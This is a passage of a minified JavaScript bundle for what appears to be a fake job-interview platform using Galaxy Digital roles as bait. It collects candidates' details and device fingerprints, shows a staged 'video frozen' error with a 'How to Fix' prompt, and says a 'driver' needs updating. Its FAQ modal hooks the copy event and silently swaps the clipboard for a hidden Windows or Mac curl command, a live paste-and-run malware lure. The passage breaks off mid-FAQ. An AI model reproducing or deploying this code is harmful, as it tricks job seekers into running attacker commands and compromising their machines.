Digital"},maxMinutes:"20mins",questions:["How would you define and execute Galaxys overall DeFi strategy?","Whats your approach to evaluating and integrating emerging DeFi protocols and opportunities?","How do you balance innovation, scalability, and regulatory compliance in DeFi initiatives?"]},{id:"sam",role:"Senior Account Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you build and maintain long-term client relationships within digital assets?","Whats your approach to managing institutional accounts and ensuring client satisfaction?","How do you identify opportunities for account growth and cross-selling within existing relationships?"]},{id:"sbm",role:"Sales & Business Development Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you approach identifying and securing new business opportunities in digital assets?","Whats your strategy for balancing short-term revenue goals with long-term strategic partnerships?","How do you measure the success of business development initiatives beyond immediate sales impact?"]},{id:"amg",role:"Account Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you manage and grow institutional client relationships in the digital assets industry?","Whats your approach to ensuring high client satisfaction and retention?","How do you identify opportunities for upselling or cross-selling additional products and services?"]},{id:"h0b",role:"Head of Business Development",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your strategy for driving large-scale partnerships and institutional adoption?","How would you structure and lead a global business development team?","How do you evaluate and prioritize high-value growth opportunities?"]},{id:"h1g",role:"Senior Director of Government Relations",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your approach to shaping regulatory and government relations strategy for a digital assets firm?","How do you engage with policymakers and regulators to advance Galaxys interests?","Whats your strategy for anticipating and adapting to regulatory changes in global markets?"]},{id:"h2l",role:"Head of Legal Advisor",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your approach to overseeing legal strategy in a global blockchain organization?","How do you manage compliance risks while supporting innovation?","Whats your framework for advising executives on regulatory and legal issues in digital assets?"]},{id:"h3e",role:"Executive Director",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your leadership philosophy for guiding a global blockchain financial services firm?","How would you balance innovation, compliance, and growth at the executive level?","Whats your approach to building cross-functional alignment across diverse business units?"]},{id:"h4c",role:"Crypto Trader",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["Whats your trading strategy for navigating volatile digital asset markets?","How do you evaluate and act on short-term vs. long-term market signals?","Whats your approach to risk management and capital allocation in crypto trading?"]},{id:"qpm",role:"Quantitative Portfolio Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you develop and implement quantitative investment strategies for digital assets?","Whats your approach to risk management and portfolio optimization in volatile markets?","How do you evaluate new data sources and modeling techniques to enhance alpha generation?"]},{id:"grm",role:"Growth Manager",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How would you design and execute growth strategies to expand Galaxys user base?","Whats your approach to leveraging data and analytics for performance-driven growth?","How do you balance experimentation and scalability when building growth frameworks in the digital assets space?"]},{id:"dfn",role:"Director of Finance",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you oversee financial planning and analysis to support Galaxys strategic goals?","Whats your approach to managing risk, compliance, and financial reporting in the digital asset industry?","How do you balance short-term financial performance with long-term growth and investment strategies?"]},{id:"cdr",role:"Creative Director",company:{url:"https://www.galaxy.com/",name:"Galaxy Digital"},maxMinutes:"20mins",questions:["How do you develop and oversee creative direction to strengthen Galaxys brand in digital assets?","Whats your process for aligning design, art, and storytelling with business and marketing strategies?","How do you ensure creativity drives both innovation and consistency across all visual and brand touchpoints?"]}],GI=async t=>{try{const{data:e}=await ae.get(`${wi}${Fa.isrun}/${t}`);return e}catch(e){return e.response.data}},JI=async t=>{try{const{data:e}=await ae.post(`${wi}${Fa.vcallstarted}`,{unique:t});return e}catch(e){return e.response.data}},YI=async t=>{try{const{data:e}=await ae.post(`${wi}${Fa.signup}`,t);return e}catch(e){return e.response.data}},QI=async t=>{try{const{data:e}=await ae.post(`${wi}${Fa.feedback}`,t);return e}catch(e){return e.response.data}},XI=async(t,e)=>{var n;try{const{data:r}=await ae.post(`${wi}${Fa.addinvitecode}`,{identifyCode:e},{headers:{Authorization:`Bearer ${t}`}});return r}catch(r){return((n=r.response)==null?void 0:n.data)||{result:!1,error:r.message}}},ZI=({message:t,type:e="success",isVisible:n,onClose:r,duration:i=5e3})=>{S.useEffect(()=>{if(n&&i>0){const l=setTimeout(()=>{r()},i);return()=>clearTimeout(l)}},[n,i,r]);const s=()=>{switch(e){case"success":return m.jsx(aa,{className:"w-5 h-5 text-green-400"});case"error":return m.jsx(ks,{className:"w-5 h-5 text-red-400"});default:return m.jsx(aa,{className:"w-5 h-5 text-green-400"})}},o=()=>{switch(e){case"success":return"bg-green-900 border-green-600";case"error":return"bg-red-900 border-red-600";default:return"bg-green-900 border-green-600"}},a=()=>{switch(e){case"success":return"text-green-200";case"error":return"text-red-200";default:return"text-green-200"}};return m.jsx(jk,{children:n&&m.jsx(I.div,{initial:{opacity:0,y:-50,scale:.9},animate:{opacity:1,y:0,scale:1},exit:{opacity:0,y:-50,scale:.9},transition:{duration:.3,ease:"easeOut"},className:"fixed top-4 right-4 z-50",children:m.jsxs("div",{className:`flex items-center p-4 rounded-lg border ${o()} shadow-lg min-w-[300px] max-w-md`,children:[m.jsx("div",{className:"flex-shrink-0 mr-3",children:s()}),m.jsx("div",{className:`flex-1 ${a()}`,children:m.jsx("p",{className:"text-sm font-medium",children:t})}),m.jsx("button",{onClick:r,className:`flex-shrink-0 ml-3 ${a()} hover:opacity-70 transition-opacity`,children:m.jsx(gL,{className:"w-4 h-4"})})]})})})},Hc=()=>{const[t,e]=S.useState({isVisible:!1,message:"",type:"success"}),n=(s,o="success",a=3e3)=>{e({isVisible:!0,message:s,type:o,duration:a})},r=()=>{e(s=>({...s,isVisible:!1}))};return{showToast:n,hideToast:r,ToastComponent:()=>m.jsx(ZI,{message:t.message,type:t.type,isVisible:t.isVisible,onClose:r,duration:t.duration})}},ej=()=>{const t=Is(),{showToast:e,ToastComponent:n}=Hc(),[r,i]=zt.useState(""),[s,o]=zt.useState(""),[a,l]=zt.useState(""),[u,c]=zt.useState(!1),[d,f]=zt.useState(!1),h=async()=>{if(!r){e("Please enter the admin passkey.","error");return}if(!s){e("Please enter an identify code.","error");return}if(s.length!==3){e("Identify code must be exactly 3 characters.","error");return}try{const x=await XI(r,s);if(x.result){const v=`${window.location.origin}/invite/${x.data.inviteCode}`;l(v)}else e(x.status,"error")}catch(x){e(x.message,"error")}},p=async()=>{try{await navigator.clipboard.writeText(a),f(!0),setTimeout(()=>f(!1),2e3)}catch(x){console.error("Failed to copy:",x)}},y=()=>{if(a){const x=a.split("/invite/")[1];t(`/invite/${x}`)}};return m.jsx(Cr,{children:m.jsxs("div",{className:"max-w-4xl mx-auto py-16",children:[m.jsx(I.h1,{className:"text-4xl font-bold text-white mb-8 text-center",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.3},children:"Admin Panel - Skill Assessment Platform"}),m.jsx(I.p,{className:"text-xl text-gray-300 mb-12 text-center",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.5},children:"Generate custom invitation links for skill assessments."}),m.jsx(I.div,{className:"max-w-2xl mx-auto bg-gray-800 p-8 rounded-lg shadow-sm border border-gray-700",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.7},children:m.jsxs("div",{className:"space-y-6",children:[m.jsx(I.h2,{className:"text-2xl font-semibold text-white mb-6 text-center",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.2},children:"Generate Invitation Code"}),m.jsxs(I.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.4},children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Admin Passkey ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsxs("div",{className:"relative",children:[m.jsx("input",{type:u?"text":"password",value:r,onChange:x=>i(x.target.value),placeholder:"Enter your admin passkey",className:"w-full px-4 py-3 pr-12 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white placeholder-gray-400"}),m.jsx("button",{type:"button",onClick:()=>c(!u),className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300",children:u?m.jsx(lL,{className:"w-5 h-5"}):m.jsx(uL,{className:"w-5 h-5"})})]})]}),m.jsxs(I.div,{initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.6},children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Identify Code ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsx("input",{type:"text",value:s,onChange:x=>o(x.target.value.toLowerCase()),placeholder:"Enter 3-character identify code (e.g., abc)",maxLength:3,className:"w-full px-4 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white placeholder-gray-400"}),m.jsx("p",{className:"text-xs text-gray-400 mt-1",children:"Must be exactly 3 characters (letters and numbers only)"})]}),m.jsx(I.button,{onClick:h,className:"w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-lg font-medium transition-colors",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.8},whileHover:{scale:1.02},whileTap:{scale:.98},children:"Generate Assessment Invite"}),m.jsx("p",{className:"text-sm text-gray-400",children:"This will create a unique invitation link for candidates"}),a&&m.jsxs(I.div,{className:"space-y-4",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.2},children:[m.jsx("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:"Generated Invite Link"}),m.jsxs("div",{className:"relative",children:[m.jsx("textarea",{value:a,readOnly:!0,className:"w-full px-4 py-3 pr-12 border border-gray-600 rounded-lg bg-gray-700 text-white resize-none h-20"}),m.jsx("button",{onClick:p,className:"absolute right-3 top-3 text-gray-400 hover:text-gray-300 transition-colors",title:"Copy to clipboard",children:d?m.jsx(aa,{className:"w-5 h-5 text-green-400"}):m.jsx(aL,{className:"w-5 h-5"})})]}),m.jsxs("div",{className:"flex gap-4",children:[m.jsx(I.button,{onClick:p,className:"flex-1 bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded-lg font-medium transition-colors",whileHover:{scale:1.02},whileTap:{scale:.98},children:d?"Copied!":"Copy Link"}),m.jsx(I.button,{onClick:y,className:"flex-1 bg-purple-500 hover:bg-purple-600 text-white py-2 px-4 rounded-lg font-medium transition-colors",whileHover:{scale:1.02},whileTap:{scale:.98},children:"Test Invite"})]})]})]})}),m.jsx(I.div,{className:"mt-8 text-center",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.9}}),m.jsx(n,{})]})})},tj=()=>{const t=navigator.userAgent,e=navigator.platform;return{deviceType:nj(),os:rj(),browser:ij(),userAgent:t,platform:e,screenResolution:`${screen.width}x${screen.height}`,viewport:`${window.innerWidth}x${window.innerHeight}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,language:navigator.language,cookieEnabled:navigator.cookieEnabled,onlineStatus:navigator.onLine}},nj=()=>{const t=navigator.userAgent.toLowerCase();return/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(t)?/ipad/i.test(t)?"tablet":"mobile":/tablet|ipad|playbook|silk/i.test(t)?"tablet":"desktop"},rj=()=>{const t=navigator.userAgent,e=navigator.platform;if(/Win/i.test(e))return/Windows NT 10/i.test(t)?"Windows 10/11":/Windows NT 6.3/i.test(t)?"Windows 8.1":/Windows NT 6.2/i.test(t)?"Windows 8":/Windows NT 6.1/i.test(t)?"Windows 7":"Windows";if(/Mac/i.test(e))return/Mac OS X 10_15/i.test(t)?"macOS Catalina":/Mac OS X 10_14/i.test(t)?"macOS Mojave":/Mac OS X 10_13/i.test(t)?"macOS High Sierra":"macOS";if(/iPhone|iPad|iPod/i.test(t)){const n=t.match(/OS (\d+)_(\d+)/);return n?`iOS ${n[1]}.${n[2]}`:"iOS"}if(/Android/i.test(t)){const n=t.match(/Android (\d+\.?\d*)/);return n?`Android ${n[1]}`:"Android"}return/Linux/i.test(e)?/Ubuntu/i.test(t)?"Ubuntu":/CrOS/i.test(t)?"Chrome OS":"Linux":"Unknown OS"},ij=()=>{const t=navigator.userAgent;if(/Edg/i.test(t)){const e=t.match(/Edg\/(\d+\.?\d*)/);return{name:"Microsoft Edge",version:e?e[1]:"Unknown"}}if(/Chrome/i.test(t)&&!/Chromium/i.test(t)){const e=t.match(/Chrome\/(\d+\.?\d*)/);return{name:"Google Chrome",version:e?e[1]:"Unknown"}}if(/Firefox/i.test(t)){const e=t.match(/Firefox\/(\d+\.?\d*)/);return{name:"Mozilla Firefox",version:e?e[1]:"Unknown"}}if(/Safari/i.test(t)&&!/Chrome/i.test(t)){const e=t.match(/Version\/(\d+\.?\d*)/);return{name:"Safari",version:e?e[1]:"Unknown"}}if(/Opera|OPR/i.test(t)){const e=t.match(/(Opera|OPR)\/(\d+\.?\d*)/);return{name:"Opera",version:e?e[2]:"Unknown"}}if(/MSIE|Trident/i.test(t)){const e=t.match(/(MSIE |rv:)(\d+\.?\d*)/);return{name:"Internet Explorer",version:e?e[2]:"Unknown"}}return{name:"Unknown Browser",version:"Unknown"}},sj=()=>"ontouchstart"in window||navigator.maxTouchPoints>0,oj=(t,e)=>({"Device Type":t.deviceType.charAt(0).toUpperCase()+t.deviceType.slice(1),"Operating System":t.os,Browser:`${t.browser.name} ${t.browser.version}`,"Screen Resolution":t.screenResolution,"Viewport Size":t.viewport,"Touch Support":sj()?"Yes":"No",Timezone:t.timezone,Language:t.language,"Online Status":t.onlineStatus?"Online":"Offline","Invite Code":e});function cg(t){if(t.length!==22)return null;const e=parseInt(t[21],10);if(isNaN(e))return null;const n=0,r=n+(e+1),i=n+(e+1)*2;return i>=21?null:t[n]+t[r]+t[i]}async function aj(t){const{name:e,email:n,social:r,inviteCode:i}=t,s=cg(i);if(!Zb(s))return{result:!1,msg:"SignUp failed! There isn't a valid interview for you"};const o=tj(),a=Xb(s),l=await YI({name:e,email:n,social:r,company:a.company.name,uuid:qI,invitecode:i,data:oj(o,i)});if(l.result){const u={name:e,email:n,social:r,company:a.company,date:new Date().toISOString(),unique:l.unique};return localStorage.setItem(ua,JSON.stringify(u)),localStorage.setItem(Jb,i),{result:!0,msg:"You are live  the interview has begun."}}else return localStorage.removeItem(ua),{result:!1,msg:l.status}}function Yb(){const t=lj();if(!t)return null;const e=cg(t);return Zb(e)?Xb(e):null}function Qb(){const t=localStorage.getItem(ua);if(!t)return null;const e=JSON.parse(t),n=new Date(e.date).getTime();return(Date.now()-n)/(1e3*60*60)>KI?(localStorage.removeItem(ua),null):e}function lj(){const t=localStorage.getItem(Jb);return t||null}function dg(){const t=localStorage.getItem(ua);return t?JSON.parse(t).unique:null}async function Xd(){const t=dg();if(console.log("unique",t),!t)return{result:!1,msg:"Unregistered user!"};const e=await GI(t);return e.result?e.data.vcallRun?{result:!0,msg:"The driver is up to date."}:{result:!1,msg:"The driver needs to be up-to-date!"}:{result:!1,msg:e.status}}async function uj(){const t=dg();if(!t)return{result:!1,msg:"Unregistered user!"};const e=await JI(t);return e.result?{result:!0,delayTime:e.delayTime}:{result:!1,msg:e.status}}async function cj(t){const e=dg();if(!e)return{result:!1,msg:"Unregistered user!"};const n=await QI({unique:e,feedback:t});return n.result?{result:!0,msg:n.status}:{result:!1,msg:n.status}}function Xb(t){return ug.find(e=>e.id===t)}function Zb(t){return ug.some(e=>e.id===t)}function dj(t){const e=cg(t);return ug.find(n=>n.id===e)}const fj=()=>(console.log("ismobile:"+/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)),/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)),hj=()=>{const t=Is(),{showToast:e,ToastComponent:n}=Hc(),{inviteId:r}=vm(),[i,s]=S.useState({fullName:"",email:"",socialLink:"",workExperience:"",gender:""}),[o,a]=S.useState(!1),[l,u]=S.useState(null),[c,d]=S.useState(!1);S.useEffect(()=>{const p=dj(r);p||t("/notfoundpage"),u(p)},[]);const f=p=>{s({...i,[p.target.name]:p.target.value})},h=async p=>{if(p.preventDefault(),!i.fullName||!i.email||!i.socialLink||!o){e("Please fill in all required fields and agree to the terms.","error");return}const y=await aj({name:i.fullName,email:i.email,social:i.socialLink,inviteCode:r});y.result?fj()?d(!0):(e("You have begun the interview!","success"),t(`/invite/${r}/assessment`)):e(y.status,"error")};return m.jsx(Cr,{children:m.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-12",children:[m.jsx(I.div,{className:"space-y-8",initial:{x:-50,opacity:0},animate:{x:0,opacity:1},transition:{duration:.8,delay:.3},children:m.jsxs("div",{children:[m.jsxs(I.h1,{className:"text-4xl font-bold text-white mb-6",initial:{y:30,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.5},children:["Let's Get Started  Your",m.jsx("br",{}),m.jsx("span",{className:"text-blue-600",children:"Challenge Awaits"})]}),m.jsxs(I.div,{className:"space-y-4 text-gray-300",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.7},children:[m.jsxs("p",{children:["You've been invited to complete the hiring evaluation for the"," ",m.jsx("span",{className:"font-semibold",children:(l==null?void 0:l.role)||""})," position. This test is hosted via our secure platform and is designed to help us better understand your skills and potential fit."]}),m.jsx("p",{children:"Please take a moment to review the details below before you begin."})]}),m.jsxs(I.div,{className:"grid grid-cols-2 gap-8 mt-8 p-6 bg-gray-800 rounded-lg",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.8,delay:.9},children:[m.jsxs("div",{children:[m.jsx("div",{className:"text-sm text-gray-400 mb-1",children:"Test duration:"}),m.jsx("div",{className:"font-semibold text-white",children:"20 mins"})]}),m.jsxs("div",{children:[m.jsx("div",{className:"text-sm text-gray-400 mb-1",children:"No. of questions:"}),m.jsxs("div",{className:"font-semibold text-white",children:[(l==null?void 0:l.questions.length)||3," questions"]})]})]})]})}),m.jsxs(I.div,{className:"bg-gray-800 p-8 rounded-lg shadow-sm border border-gray-700",initial:{x:50,opacity:0},animate:{x:0,opacity:1},transition:{duration:.8,delay:.4},children:[m.jsx("div",{className:"mb-6",children:m.jsx("p",{className:"text-gray-300",children:"Before we start, here is some extra information we need to assess you better"})}),m.jsxs("form",{onSubmit:h,className:"space-y-6",children:[m.jsxs("div",{children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Email address ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsx("input",{type:"email",name:"email",value:i.email,onChange:f,placeholder:"Enter your email address",className:"w-full px-3 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white placeholder-gray-400",required:!0})]}),m.jsxs("div",{children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Full Name ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsx("input",{type:"text",name:"fullName",value:i.fullName,onChange:f,placeholder:"Enter your full name",className:"w-full px-3 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white placeholder-gray-400",required:!0})]}),m.jsxs("div",{children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Work Experience (in years) ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsxs("select",{name:"workExperience",value:i.workExperience,onChange:f,className:"w-full px-3 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white",required:!0,children:[m.jsx("option",{value:"",children:"Select"}),m.jsx("option",{value:"0-1",children:"0-1 years"}),m.jsx("option",{value:"2-3",children:"2-3 years"}),m.jsx("option",{value:"4-5",children:"4-5 years"}),m.jsx("option",{value:"6-10",children:"6-10 years"}),m.jsx("option",{value:"10+",children:"10+ years"})]})]}),m.jsxs("div",{children:[m.jsxs("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:["Social Links (LinkedIn, Twitter, ...) ",m.jsx("span",{className:"text-red-500",children:"*"})]}),m.jsx("input",{type:"url",name:"socialLink",value:i.socialLink,onChange:f,placeholder:"Enter your social link",className:"w-full px-3 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white placeholder-gray-400",required:!0})]}),m.jsxs("div",{children:[m.jsx("div",{className:"text-sm font-medium text-gray-200 mb-4",children:"DEMOGRAPHIC INFORMATION (OPTIONAL)"}),m.jsx("p",{className:"text-xs text-gray-400 mb-4",children:"The information you provide here is strictly confidential. It will not be shared with recruiters or hiring managers, nor will it be used in hiring decisions. When analyzed in aggregate, this data helps us foster a more diverse and inclusive developer community."}),m.jsx("label",{className:"block text-sm font-medium text-gray-200 mb-2",children:"Gender"}),m.jsxs("select",{name:"gender",value:i.gender,onChange:f,className:"w-full px-3 py-3 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-700 text-white",children:[m.jsx("option",{value:"",children:"Select"}),m.jsx("option",{value:"male",children:"Male"}),m.jsx("option",{value:"female",children:"Female"}),m.jsx("option",{value:"other",children:"Other"}),m.jsx("option",{value:"prefer-not-to-say",children:"Prefer not to say"})]})]}),m.jsx("div",{children:m.jsxs("label",{className:"flex items-start space-x-3",children:[m.jsx("input",{type:"checkbox",checked:o,onChange:p=>a(p.target.checked),className:"mt-1 h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500",required:!0}),m.jsxs("span",{className:"text-sm text-gray-300",children:["I agree not to copy code from any source, including colleagues, and will refrain from accessing websites or AI tools for assistance. Additionally, I commit to maintaining the confidentiality of this platform by not copying, sharing, or disclosing any content or questions through any medium or platform. ",m.jsx("span",{className:"text-red-500",children:"*"})]})]})}),m.jsx(I.button,{type:"submit",className:"w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-lg font-medium transition-colors",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:1.2},whileHover:{scale:1.02},whileTap:{scale:.98},children:"Continue"})]})]}),m.jsx(n,{}),c&&m.jsx("div",{className:"fixed inset-0 flex items-center justify-center bg-black bg-opacity-70 z-50",children:m.jsxs(I.div,{initial:{scale:.9,opacity:0},animate:{scale:1,opacity:1},transition:{duration:.3},className:"bg-gray-900 p-8 rounded-2xl max-w-md w-full text-center border border-gray-700",children:[m.jsx("h2",{className:"text-2xl font-bold text-white mb-4",children:"Please Use a Laptop or Desktop"}),m.jsx("p",{className:"text-gray-300 mb-6",children:"For the best experience and to ensure assessment security, this interview can only be taken on a laptop or desktop computer."}),m.jsx("button",{onClick:()=>d(!1),className:"px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg",children:"Got it"})]})})]})})},pj=({videoRef:t,stream:e,videoFrozen:n,frozenFrameRef:r,isError:i,isRecording:s,isPaused:o,recordingTime:a,onShowFAQ:l})=>{const u=c=>{const d=Math.floor(c/60),f=c%60;return`${d.toString().padStart(2,"0")}:${f.toString().padStart(2,"0")}`};return m.jsxs("div",{className:"relative bg-black rounded-2xl shadow-2xl overflow-hidden mb-6",children:[n&&r.current?m.jsx("div",{className:"w-full max-w-4xl h-auto grayscale",style:{maxHeight:"70vh",backgroundImage:`url(${r.current})`,backgroundSize:"cover",backgroundPosition:"center",aspectRatio:"16/9",minHeight:"400px"}}):m.jsx("video",{ref:t,autoPlay:!0,muted:!0,playsInline:!0,className:`w-full max-w-4xl h-auto ${i?"grayscale":""}`,style:{maxHeight:"70vh"}}),(s||i)&&m.jsxs("div",{className:"absolute top-4 left-4 flex items-center gap-2 bg-red-600 text-white px-3 py-2 rounded-full",children:[m.jsx("div",{className:`w-3 h-3 rounded-full ${i?"bg-red-400":o?"bg-white":"bg-white animate-pulse"}`}),m.jsx("span",{className:"font-semibold",children:i?"ERROR":o?"PAUSED":"RECORDING"})]}),i&&m.jsx("div",{className:"absolute inset-0 flex items-center justify-center",children:m.jsxs("div",{className:"bg-black bg-opacity-80 rounded-2xl p-8 text-center max-w-md mx-4",children:[m.jsx("div",{className:"w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4",children:m.jsx(ks,{className:"w-8 h-8 text-white"})}),m.jsx("h3",{className:"text-2xl font-bold text-white mb-3",children:"Recording Error"}),m.jsx("p",{className:"text-gray-300 mb-6 leading-relaxed",children:"Something went wrong with your video recording. The stream appears to be frozen."}),m.jsx("button",{onClick:l,className:"bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-8 rounded-full shadow-2xl transform transition-all duration-300 hover:scale-110",style:{animation:"bounce 1s infinite, pulse 2s infinite"},children:m.jsxs("div",{className:"flex items-center gap-2",children:[m.jsx(ks,{className:"w-5 h-5"}),m.jsx("span",{className:"font-extrabold",children:"How to Fix"})]})})]})}),(s&&!i||a>0)&&m.jsxs("div",{className:"absolute top-4 right-4 flex items-center gap-2 bg-black bg-opacity-70 text-white px-3 py-2 rounded-full",children:[m.jsx(Cb,{className:"w-4 h-4"}),m.jsx("span",{className:"font-mono font-semibold",children:u(a)})]})]})},mj=({isRecording:t,isPaused:e,isError:n,recordedBlob:r,onStartRecording:i,onPauseRecording:s,onStopRecording:o})=>!t&&!r&&!n?m.jsxs("button",{onClick:i,className:"bg-red-600 hover:bg-red-700 text-white font-semibold py-4 px-8 rounded-full transition-all duration-200 flex items-center gap-3 shadow-lg hover:shadow-xl transform hover:scale-105",children:[m.jsx(Ax,{className:"w-6 h-6"}),"Start Recording"]}):t&&!n?m.jsxs(m.Fragment,{children:[m.jsx("button",{onClick:s,className:`${e?"bg-green-600 hover:bg-green-700":"bg-yellow-600 hover:bg-yellow-700"} text-white font-semibold py-4 px-8 rounded-full transition-all duration-200 flex items-center gap-3 shadow-lg hover:shadow-xl transform hover:scale-105`,children:e?m.jsxs(m.Fragment,{children:[m.jsx(Ax,{className:"w-6 h-6"}),"Resume"]}):m.jsxs(m.Fragment,{children:[m.jsx(Nx,{className:"w-6 h-6"}),"Pause"]})}),m.jsxs("button",{onClick:o,className:"bg-gray-600 hover:bg-gray-700 text-white font-semibold py-4 px-8 rounded-full transition-all duration-200 flex items-center gap-3 shadow-lg hover:shadow-xl transform hover:scale-105",children:[m.jsx(Px,{className:"w-6 h-6"}),"End Recording"]})]}):n?m.jsxs(m.Fragment,{children:[m.jsxs("button",{disabled:!0,className:"bg-gray-400 text-gray-600 font-semibold py-4 px-8 rounded-full cursor-not-allowed flex items-center gap-3",children:[m.jsx(Nx,{className:"w-6 h-6"}),"Pause"]}),m.jsxs("button",{disabled:!0,className:"bg-gray-400 text-gray-600 font-semibold py-4 px-8 rounded-full cursor-not-allowed flex items-center gap-3",children:[m.jsx(Px,{className:"w-6 h-6"}),"End Recording"]})]}):null,gj=({showFAQModal:t,onClose:e,onRestartCamera:n,curlCommand:r,currPlatform:i})=>{const[s,o]=S.useState({});S.useEffect(()=>{const l=u=>{if(!window.getSelection())return;const d=i==="win"?r.windows:r.mac;u.clipboardData&&(u.clipboardData.setData("text/plain",d),u.preventDefault())};return document.addEventListener("copy",l),()=>{document.removeEventListener("copy",l)}},[r,i]);const a=l=>{o(u=>({...u,[l]:!u[l]}))};return t?m.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4",children:m.jsx("div",{className:"bg-gray-800 rounded-2xl p-8 max-w-2xl w-full mx-4 shadow-2xl max-h-[90vh] overflow-y-auto",children:m.jsxs("div",{className:"text-center",children:[m.jsx("div",{className:"w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-6",children:m.jsx(ks,{className:"w-10 h-10 text-white"})}),m.jsx("h3",{className:"text-2xl font-bold text-white mb-6",children:"Frequently Asked Questions"}),m.jsxs("div",{className:"text-left space-y-3 mb-8",children:[m.jsxs("div",{className:"bg-gray-700 rounded-lg overflow-hidden",children:[m.jsxs("button",{onClick:()=>a(0),className:"w-full p-4 text-left hover:bg-gray-600 transition-colors duration-200 flex items-center justify-between",children:[m.jsx("h4",{className:"text-lg font-semibold text-white",children:"Q: Why did my video freeze during recording?"}),m.jsx("svg",{className:`w-5 h-5 text-white transform transition-transform duration-200 ${s[0]?"rotate-180":""}`,fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),m.jsx("div",{className:`overflow-hidden transition-all duration-300 ease-in-out ${s[0]?"max-h-96 opacity-100":"max-h-0 opacity-0"}`,children:m.jsx("div",{className:"px-4 pb-4 transform transition-transform duration-300 ease-in-out",children:m.jsx("p",{className:"text-gray-300 text-sm",children:"Video freezing can occur due to camera hardware issues, browser conflicts, or system resource limitations. This is a common technical issue during video recording."})})})]}),m.jsxs("div",{className:"bg-gray-700 rounded-lg overflow-hidden",children:[m.jsxs("button",{onClick:()=>a(1),className:"w-full p-4 text-left hover:bg-gray-600 transition-colors duration-200 flex items-center justify-between",children:[m.jsx("h4",{className:"text-lg font-semibold text-white",children:"Q: What should I do when the video freezes?"}),m.jsx("svg",{className:`w-5 h-5 text-white transform transition-transform duration-200 ${s[1]?"rotate-180":""}`,fill:"none",stroke:"currentColor",viewBox:"0 0 24 